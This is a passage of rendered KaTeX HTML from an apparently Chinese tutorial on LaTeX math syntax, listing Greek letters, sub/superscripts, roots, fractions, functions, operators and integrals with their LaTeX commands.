\Lambda</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>μ</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">\mu M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">μ</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span></td><td><code>\mu \Mu</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ξ</mi><mi mathvariant="normal">Ξ</mi></mrow><annotation encoding="application/x-tex">\xi \Xi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.04601em;">ξ</span><span class="mord">Ξ</span></span></span></span></td><td><code>\xi \Xi</code></td></tr><tr><td>o O</td><td><code>o O</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi><mi mathvariant="normal">Π</mi></mrow><annotation encoding="application/x-tex">\pi \Pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mord">Π</span></span></span></span></td><td><code>\pi \Pi</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ρ</mi><mi>ϱ</mi><mi mathvariant="normal">P</mi></mrow><annotation encoding="application/x-tex">\rho \varrho \Rho</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ρ</span><span class="mord mathdefault">ϱ</span><span class="mord"><span class="mord mathrm">P</span></span></span></span></span></td><td><code>\rho \varrho \Rho</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>σ</mi><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\sigma \Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mord">Σ</span></span></span></span></td><td><code>\sigma \Sigma</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>τ</mi><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau \tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></td><td><code>\tau \Tau</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>υ</mi><mi mathvariant="normal">Υ</mi></mrow><annotation encoding="application/x-tex">\upsilon \Upsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">υ</span><span class="mord">Υ</span></span></span></span></td><td><code>\upsilon \Upsilon</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi><mi>φ</mi><mi mathvariant="normal">Φ</mi></mrow><annotation encoding="application/x-tex">\phi \varphi \Phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span><span class="mord mathdefault">φ</span><span class="mord">Φ</span></span></span></span></td><td><code>\phi \varphi \Phi</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>χ</mi><mi mathvariant="normal">X</mi></mrow><annotation encoding="application/x-tex">\chi \Chi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">χ</span><span class="mord"><span class="mord mathrm">X</span></span></span></span></span></td><td><code>\chi \Chi</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ψ</mi><mi mathvariant="normal">Ψ</mi></mrow><annotation encoding="application/x-tex">\psi \Psi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mord">Ψ</span></span></span></span></td><td><code>\psi \Psi</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ω</mi><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">\omega \Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mord">Ω</span></span></span></span></td><td><code>\omega \Omega</code></td></tr></tbody></table><h3 id="上下标"><a class="markdownIt-Anchor" href="#上下标"></a> 上下标</h3><ul><li>上下标如果多余一个字符或符号，需要用{}括起来。</li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">x^1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></td><td><code>x^1</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td><code>x_1</code></td></tr></tbody></table><h3 id="根号"><a class="markdownIt-Anchor" href="#根号"></a> 根号</h3><ul><li>形式：<code>\sqrt[开方次数，默认为2]&#123;开方公式&#125;</code></li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mrow><mi>i</mi><mi>j</mi></mrow><mn>2</mn></msubsup><mspace width="1em"/><msqrt><mi>x</mi></msqrt><mspace width="1em"/><mroot><mi>x</mi><mn>3</mn></mroot></mrow><annotation encoding="application/x-tex">x_{ij}^2\quad \sqrt{x}\quad \sqrt[3]{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20888em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">x</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6585560000000001em;"><span style="top:-2.836336em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">x</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span></td><td><code>x_&#123;ij&#125;^2\quad \sqrt&#123;x&#125;\quad \sqrt[3]&#123;x&#125;</code></td></tr></tbody></table><ul><li><code>\quad</code>表示添加空格，或者<code>\;</code>。</li></ul><h3 id="分数"><a class="markdownIt-Anchor" href="#分数"></a> 分数</h3><ul><li><code>\frac</code>表示分数，</li><li>字号工具环境设置：<ul><li><code>\dfrac</code>命令把字号设置为独立公式中的大小；</li><li><code>\tfrac</code>则把字号设置为行间公式中的大小。</li></ul></li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mn>2</mn></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\frac{1}{2} \dfrac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td><code>\frac&#123;1&#125;&#123;2&#125; \dfrac&#123;1&#125;&#123;2&#125;</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2} \tfrac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td><code>\frac&#123;1&#125;&#123;2&#125; \tfrac&#123;1&#125;&#123;2&#125;</code></td></tr></tbody></table><h3 id="三角函数-对数-指数"><a class="markdownIt-Anchor" href="#三角函数-对数-指数"></a> 三角函数、对数、指数</h3><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>tan</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\tan</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mop">tan</span></span></span></span></td><td><code>\tan</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>sin</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\sin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mop">sin</span></span></span></span></td><td><code>\sin</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>cos</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\cos</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mop">cos</span></span></span></span></td><td><code>\cos</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>lg</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\lg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">l<span style="margin-right:0.01389em;">g</span></span></span></span></span></td><td><code>\lg</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>arcsin</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\arcsin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mop">arcsin</span></span></span></span></td><td><code>\arcsin</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>arctan</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\arctan</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mop">arctan</span></span></span></span></td><td><code>\arctan</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>min</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\min</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mop">min</span></span></span></span></td><td><code>\min</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>max</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\max</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mop">max</span></span></span></span></td><td><code>\max</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>exp</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\exp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mop">exp</span></span></span></span></td><td><code>\exp</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>log</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\log</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span></span></span></span></td><td><code>\log</code></td></tr></tbody></table><h3 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> 运算符</h3><h4 id="简单的四则运算"><a class="markdownIt-Anchor" href="#简单的四则运算"></a> 简单的四则运算</h4><ul><li><code>+ - * / =</code> 直接输入</li></ul><h4 id="集合符号"><a class="markdownIt-Anchor" href="#集合符号"></a> 集合符号</h4><ul><li>特殊运算则用以下特殊命令</li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>±</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\pm1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></td><td><code>\pm</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>×</mo></mrow><annotation encoding="application/x-tex">\times</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">×</span></span></span></span></td><td><code>\times</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>÷</mo></mrow><annotation encoding="application/x-tex">\div</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">÷</span></span></span></span></td><td><code>\div</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⋅</mo></mrow><annotation encoding="application/x-tex">\cdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">⋅</span></span></span></span></td><td><code>\cdot</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">\cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∩</span></span></span></span></td><td><code>\cap</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∪</mo></mrow><annotation encoding="application/x-tex">\cup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∪</span></span></span></span></td><td><code>\cup</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\geq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≥</span></span></span></span></td><td><code>\geq</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≤</mo></mrow><annotation encoding="application/x-tex">\leq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≤</span></span></span></span></td><td><code>\leq</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">≠</mi></mrow><annotation encoding="application/x-tex">\neq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span></span></span></span></td><td><code>\neq</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.48312em;vertical-align:0em;"></span><span class="mrel">≈</span></span></span></span></td><td><code>\approx</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span></span></span></span></td><td><code>\equiv</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∈</mo></mrow><annotation encoding="application/x-tex">\in</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span></span></span></span></td><td><code>\in</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∉</mi></mrow><annotation encoding="application/x-tex">\notin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.75em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.25em;"><span></span></span></span></span></span></span></span></span></span></td><td><code>\notin</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∋</mo></mrow><annotation encoding="application/x-tex">\ni</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∋</span></span></span></span></td><td><code>\ni</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span></td><td><code>\subset</code></td></tr></tbody></table><h4 id="和-积-极限-积分"><a class="markdownIt-Anchor" href="#和-积-极限-积分"></a> 和、积、极限、积分</h4><ul><li>和、积、极限、积分等运算符，这些公式在行内公式被压缩，以适应行高，可以通过<code>\limits</code>和<code>\nolimits</code>命令显示制动是否压缩</li></ul><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span></td><td><code>\sum</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∏</mo></mrow><annotation encoding="application/x-tex">\prod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span></span></span></span></td><td><code>\prod</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>lim</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\lim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">lim</span></span></span></span></td><td><code>\lim</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int</code></td></tr></tbody></table><h4 id="多重积分"><a class="markdownIt-Anchor" href="#多重积分"></a> 多重积分</h4><table><thead><tr><th>符号</th><th>LaTex形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span></span></span></span></td><td><code>\int</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∬</mo></mrow><annotation encoding="application/x-tex">\iint</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.111em;vertical-align:-0.306em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0004999999999999727em;">∬</span></span></span></span></td><td><code>\iint</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∫</mo><mo>∫</mo></mrow><annotation encoding="application/x-tex">\int \int</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.11112em;vertical-align:-0.30612em;"></span><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" 